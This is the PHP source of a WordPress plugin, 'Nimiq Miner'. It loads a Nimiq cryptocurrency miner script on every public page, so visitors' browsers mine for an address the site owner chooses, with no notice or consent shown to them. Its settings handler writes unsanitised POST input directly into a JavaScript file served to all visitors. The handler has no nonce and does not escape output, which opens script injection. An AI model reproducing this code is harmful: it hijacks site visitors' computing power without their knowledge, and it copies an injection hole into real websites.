<?php
/*
Plugin Name: Nimiq Miner
Plugin URI: https://github.com/pom75/nimiqWP
Description: A plugin to mine nim to any address that the user specifie. Look at https://github.com/pom75/nimiqWP for more information.
Version: 1.1
Author URI: https://github.com/pom75
License: GPL3
*/

add_action('wp_enqueue_scripts','ava_test_init');

function ava_test_init() {
	wp_enqueue_script( 'nimiq1', 'https://cdn.nimiq-testnet.com/nimiq.js');
	//wp_enqueue_script( 'nimiq1', 'http://cdn.nimiq.com/nimiq.js');
	wp_enqueue_script( 'nimiq2', plugins_url( './js/config.js', __FILE__ ));
    wp_enqueue_script( 'nimiq4', plugins_url( './js/nimiq.js', __FILE__ ));
	
}

function myplugin_register_options_page() {
  add_options_page('Nimiq Plugin', 'Nimiq', 'manage_options', 'myplugin', 'myplugin_options_page');
}
add_action('admin_menu', 'myplugin_register_options_page');
 function myplugin_options_page()
{
$txt_file    = file_get_contents('../wp-content/plugins/nimiq/js/config.js');
$rows        = explode("\n", $txt_file);
array_shift($rows);

$nimiq_address = str_replace(array('"','"',';',), '',(explode('=',$rows[0])[1]));
$percentOfThread = str_replace(array(';',' '), '',(explode('=',$rows[1])[1]));
$miningpool = str_replace(array(';',' '), '',(explode('=',$rows[2])[1]));

?>
  <div>
  <?php screen_icon(); ?>
  <h2>Nimiq Plugin </h2>
  <form method="post" action="#">
  <?php settings_fields( 'myplugin_options_group' ); ?>
  <h3>Settings</h3>
  <table>
  <tr valign="top">
  <th scope="row"><label for="nimiq_address">Nimiq Adresse : </label></th>
  <td><input type="text" id="nimiq_address" name="nimiq_address" value="<?php echo $nimiq_address; ?>" /></td>
  </tr>
  </tr>
  <tr valign="top">
  <th scope="row"><label for="percentOfThread">Percent Of Thread (1 - 100): </label></th>
  <td><input type="text" id="percentOfThread" name="percentOfThread" value="<?php echo $percentOfThread; ?>" /></td>
  </tr>
  <tr valign="top">
  <th scope="row"><label for="miningpool">Pool Mining (true or false): </label></th>
  <td><input type="text" id="miningpool" name="miningpool" value="<?php echo $miningpool; ?>" /></td>
  </table>
   <input type="submit" class="button button-primary" name="save" value="Save" /><br/>
   </form>
  <?php  
  
  function saveConfig()
{
	//read the entire string
	$str=file_get_contents('../wp-content/plugins/nimiq/js/config.js');

	
	$rows        = explode("\n", $str);
	array_shift($rows);

	$nimiq_address = str_replace(array('"','"',';',), '',(explode('=',$rows[0])[1]));
	$percentOfThread = (explode('=',$rows[1])[1]);
	$miningpool = str_replace(array(';',' '), '',(explode('=',$rows[2])[1]));
	

	//replace something in the file string - this is a VERY simple example
	$str=str_replace("$nimiq_address",$_POST['nimiq_address'] ,$str);
	$str=str_replace("$percentOfThread", " ".$_POST['percentOfThread'].";",$str);
	$str=str_replace("$miningpool", $_POST['miningpool'],$str);

	//write the entire string
	file_put_contents('../wp-content/plugins/nimiq/js/config.js', $str);
	
	
	echo '<meta http-equiv="refresh" content="0" />';
	
}

if(array_key_exists('save',$_POST)){
   saveConfig();
}



} ?>